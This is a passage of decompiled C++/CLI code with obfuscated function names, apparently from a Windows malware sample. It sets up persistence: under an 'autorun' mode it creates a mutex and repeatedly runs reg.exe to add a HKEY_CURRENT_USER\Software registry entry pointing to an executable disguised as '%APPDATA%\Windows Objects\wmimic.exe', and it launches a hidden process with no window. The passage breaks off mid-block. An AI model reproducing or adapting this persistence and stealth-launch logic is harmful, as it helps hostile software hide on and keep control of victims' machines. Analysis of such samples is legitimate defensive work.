      basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr1 = \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar2, ySy);
      bool flag1;
      // ISSUE: fault handler
      try
      {
        flag1 = \u003CModule\u003E.std\u002Eoperator\u003D\u003D\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E(stdAllocatorCharPtr1, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_08IHEBGAKP\u0040winstart\u003F\u0024AA\u0040);
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar2);
      }
      \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar2);
      if (flag1)
      {
        \u003CModule\u003E.Sleep(20000U);
        basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar3;
        basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr2 = \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar1, &stdAllocatorChar3);
        basic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E stdCharTraitsChar;
        // ISSUE: fault handler
        try
        {
          \u003CModule\u003E.std\u002Ebasic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdCharTraitsChar, \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(stdAllocatorCharPtr2), 32, 64, 1);
        }
        __fault
        {
          // ISSUE: method pointer
          // ISSUE: cast to a function pointer type
          \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar3);
        }
        // ISSUE: fault handler
        try
        {
          \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar3);
          \u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E((basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) &stdCharTraitsChar, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_0N\u0040GNFMHHBF\u0040Windows\u003F5log\u003F4\u003F\u0024AA\u0040);
          \u003CModule\u003E.std\u002Ebasic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Eclose(&stdCharTraitsChar);
        }
        __fault
        {
          // ISSUE: method pointer
          // ISSUE: cast to a function pointer type
          \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor), (void*) &stdCharTraitsChar);
        }
        \u003CModule\u003E.std\u002Ebasic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdCharTraitsChar);
      }
      else
      {
        basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar4;
        basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr3 = \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar1, &stdAllocatorChar4);
        // ISSUE: fault handler
        try
        {
          \u003CModule\u003E.remove(\u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(stdAllocatorCharPtr3));
        }
        __fault
        {
          // ISSUE: method pointer
          // ISSUE: cast to a function pointer type
          \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar4);
        }
        \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar4);
      }
      basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar5;
      basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr4 = \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar5, ySy);
      bool flag2;
      // ISSUE: fault handler
      try
      {
        flag2 = \u003CModule\u003E.std\u002Eoperator\u003D\u003D\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E(stdAllocatorCharPtr4, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_07NLGPFEPB\u0040autorun\u003F\u0024AA\u0040);
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar5);
      }
      \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar5);
      if (flag2)
      {
        \u003CModule\u003E.CreateMutexA((_SECURITY_ATTRIBUTES*) 0, 0, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_0BN\u0040NNGJPJFG\u0040654df6sdr4f654e89r7__autorun\u003F\u0024AA\u0040);
        if (\u003CModule\u003E.GetLastError() != 183U)
          goto label_24;
      }
      else
        goto label_44;
    }
    __fault
    {
      if (num2 == (byte) 0)
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor), (void*) &stdAllocatorChar1);
      }
    }
    \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdAllocatorChar1);
    return 0;
label_24:
    while (true)
    {
      byte num3 = 0;
      // ISSUE: fault handler
      try
      {
        \u003CModule\u003E.Sleep(5000U);
        basic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar6;
        \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar6, 3, 1);
        // ISSUE: fault handler
        try
        {
          \u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E((basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) ((IntPtr) &stdAllocatorChar6 + 8), (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_0GG\u0040NJADGLON\u0040add\u003F5\u003F\u0024CCHKEY_CURRENT_USER\u003F2Software\u003F2\u0040);
          \u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E(\u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E(\u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E((basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) ((IntPtr) &stdAllocatorChar6 + 8), (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_04DADDNBKH\u0040\u003F5\u003F\u0024CC\u003F2\u003F\u0024CC\u003F\u0024AA\u0040), \u003CModule\u003E.getenv((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_07FMLNDKFM\u0040APPDATA\u003F\u0024AA\u0040)), (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_0CL\u0040OHCELFLK\u0040\u003F2Windows\u003F5Objects\u003F2wmimic\u003F4exe\u003F2\u003F\u0024CC\u003F5wi\u0040);
          basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar7;
          basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr = \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar6, &stdAllocatorChar7);
          // ISSUE: fault handler
          try
          {
            \u003CModule\u003E.ShellExecuteA((HWND__*) 0, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_04PMOCAHAA\u0040open\u003F\u0024AA\u0040, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_07IILGNKIF\u0040reg\u003F4exe\u003F\u0024AA\u0040, \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(stdAllocatorCharPtr), (sbyte*) 0, 0);
          }
          __fault
          {
            // ISSUE: method pointer
            // ISSUE: cast to a function pointer type
            \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar7);
          }
          \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar7);
        }
        __fault
        {
          // ISSUE: method pointer
          // ISSUE: cast to a function pointer type
          \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor), (void*) &stdAllocatorChar6);
        }
        \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdAllocatorChar6);
      }
      catch (Exception ex)
      {
      }
      catch (Exception ex1) when (
      {
        // ISSUE: unable to correctly present filter
        exception* exceptionPtr;
        if (\u003CModule\u003E.__CxxExceptionFilter((void*) Marshal.GetExceptionPointers(), (void*) &\u003CModule\u003E.\u003F\u003F_R0PAVexception\u0040std\u0040\u0040\u00408, 0, (void*) &exceptionPtr) != 0)
        {
          SuccessfulFiltering;
        }
        else
          throw;
      }
      )
      {
        uint num4 = 0;
        \u003CModule\u003E.__CxxRegisterExceptionObject((void*) Marshal.GetExceptionPointers(), (void*) num1);
        try
        {
          try
          {
          }
          catch (Exception ex2) when (
          {
            // ISSUE: unable to correctly present filter
            num4 = (uint) \u003CModule\u003E.__CxxDetectRethrow((void*) Marshal.GetExceptionPointers());
            if (num4 != 0U)
            {
              SuccessfulFiltering;
            }
            else
              throw;
          }
          )
          {
          }
          continue;
          if (num4 != 0U)
            throw;
        }
        finally
        {
          \u003CModule\u003E.__CxxUnregisterExceptionObject((void*) num1, (int) num4);
        }
      }
      __fault
      {
        if (num3 == (byte) 0)
        {
          // ISSUE: method pointer
          // ISSUE: cast to a function pointer type
          \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor), (void*) &stdAllocatorChar1);
        }
      }
    }
label_44:
    // ISSUE: fault handler
    try
    {
      int num5 = 300000;
      basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar8;
      \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar8, ySy);
      // ISSUE: fault handler
      try
      {
        basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar9;
        basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr = &stdAllocatorChar9;
        if (\u003CModule\u003E.nopwSfKdGKgXzz(\u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar9, &stdAllocatorChar8)))
          goto label_49;
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar8);
      }
      \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar8);
      num2 = (byte) 1;
      \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdAllocatorChar1);
      return 0;
label_49:
      basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT;
      basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar10;
      basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar11;
      char* chPtr;
      basic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar12;
      basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar13;
      // ISSUE: fault handler
      try
      {
        \u003CModule\u003E.TSNofcmhcm(&stdAllocatorWcharT);
        // ISSUE: fault handler
        try
        {
          \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar10, ySy);
          // ISSUE: fault handler
          try
          {
            uint lastOf = \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Efind_last_of(&stdAllocatorChar10, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_01LFCBOECM\u0040\u003F4\u003F\u0024AA\u0040, *\u003CModule\u003E.__imp_\u003Fnpos\u0040\u003F\u0024basic_string\u0040DU\u003F\u0024char_traits\u0040D\u0040std\u0040\u0040V\u003F\u0024allocator\u0040D\u00402\u0040\u0040std\u0040\u00402IB);
            basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar14;
            basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr5 = \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Esubstr(&stdAllocatorChar10, &stdAllocatorChar14, 0U, lastOf);
            // ISSUE: fault handler
            try
            {
              \u003CModule\u003E.std\u002Eoperator\u002B\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E(&stdAllocatorChar11, stdAllocatorCharPtr5, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_01KICIPPFI\u0040\u003F2\u003F\u0024AA\u0040);
            }
            __fault
            {
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar14);
            }
            // ISSUE: fault handler
            try
            {
              \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar14);
              sbyte* numPtr1 = \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(&stdAllocatorChar11);
              sbyte* numPtr2 = numPtr1;
              while (*numPtr2 != (sbyte) 0)
                ++numPtr2;
              sbyte* numPtr3 = (sbyte*) ((IntPtr) numPtr2 - (IntPtr) numPtr1);
              \u0024ArrayType\u0024\u0024\u0024BY0BAE\u0040_W arrayTypeBy0BaeW;
              int num6 = (int) \u003CModule\u003E.mbstowcs((char*) &arrayTypeBy0BaeW, numPtr1, (uint) (numPtr3 + 1));
              chPtr = (char*) &arrayTypeBy0BaeW;
              sbyte* numPtr4 = ySy;
              while (*numPtr4 != (sbyte) 0)
                ++numPtr4;
              if ((UIntPtr) numPtr4 - (UIntPtr) ySy <= UIntPtr.Zero)
              {
                \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar12, 3, 1);
                // ISSUE: fault handler
                try
                {
                  \u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E(\u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E((basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) ((IntPtr) &stdAllocatorChar12 + 8), \u003CModule\u003E.getenv((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_07FMLNDKFM\u0040APPDATA\u003F\u0024AA\u0040)), (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_01KICIPPFI\u0040\u003F2\u003F\u0024AA\u0040);
                  basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar15;
                  basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr6 = \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar12, &stdAllocatorChar15);
                  // ISSUE: fault handler
                  try
                  {
                    \u003CModule\u003E.hwAYOEKvSX(&stdAllocatorChar13, \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(stdAllocatorCharPtr6), true);
                  }
                  __fault
                  {
                    // ISSUE: method pointer
                    // ISSUE: cast to a function pointer type
                    \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar15);
                  }
                  // ISSUE: fault handler
                  try
                  {
                    \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar15);
                    if (\u003CModule\u003E.std\u002Eoperator\u0021\u003D\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E(&stdAllocatorChar13, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_00CNPNBAHC\u0040\u003F\u0024AA\u0040))
                    {
                      if (!\u003CModule\u003E.GmbzzHkEbofalLU())
                        \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u003D(&stdAllocatorWcharT, (char*) &\u003CModule\u003E.\u003F\u003F_C\u0040_1BO\u0040MIPNHMBN\u0040\u003F\u0024AAn\u003F\u0024AAo\u003F\u0024AAc\u003F\u0024AAr\u003F\u0024AAe\u003F\u0024AAa\u003F\u0024AAt\u003F\u0024AAe\u003F\u0024AAf\u003F\u0024AAo\u003F\u0024AAl\u003F\u0024AAd\u003F\u0024AAe\u003F\u0024AAr\u003F\u0024AA\u003F\u0024AA\u0040);
                      new Process()
                      {
                        StartInfo = {
                          FileName = new string(\u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(&stdAllocatorChar13)),
                          Arguments = new string(\u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Ec_str(&stdAllocatorWcharT)),
                          UseShellExecute = false,
                          CreateNoWindow = true,
                          RedirectStandardOutput = true,
                          RedirectStandardError = true,
                          StandardOutputEncoding = Encoding.GetEncoding(850)
                        }
                      }.Start();
                    }
                    else
                      goto label_81;
                  }
                  __fault
                  {
                    // ISSUE: method pointer
                    // ISSUE: cast to a function pointer type
                    \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar13);
                  }
                  \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar13);
                }
                __fault
                {
                  // ISSUE: method pointer
                  // ISSUE: cast to a function pointer type
                  \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor), (void*) &stdAllocatorChar12);
                }
                \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdAllocatorChar12);
              }
              else
                goto label_88;
            }
            __fault
            {
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar11);
            }
            \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar11);
          }
          __fault
          {
            // ISSUE: method pointer
            // ISSUE: cast to a function pointer type
